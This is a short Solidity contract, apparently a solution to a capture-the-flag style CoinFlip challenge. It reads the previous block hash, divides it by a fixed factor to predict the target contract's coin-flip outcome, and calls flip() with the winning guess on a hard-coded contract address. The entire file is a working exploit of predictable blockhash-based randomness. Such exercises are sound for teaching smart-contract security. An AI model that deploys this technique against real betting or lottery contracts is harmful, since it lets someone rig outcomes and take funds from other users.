// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./default.sol";

contract FlipGuess {
    using SafeMath for uint256;
    // address coin_flip = 0x605A0c3018aEF2145F7c427581CaCD8dBf37Cc16
    CoinFlip flipper = CoinFlip(0x605A0c3018aEF2145F7c427581CaCD8dBf37Cc16);

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == true) {
            flipper.flip(true);
        } else {
            flipper.flip(false);
        }
    }
}
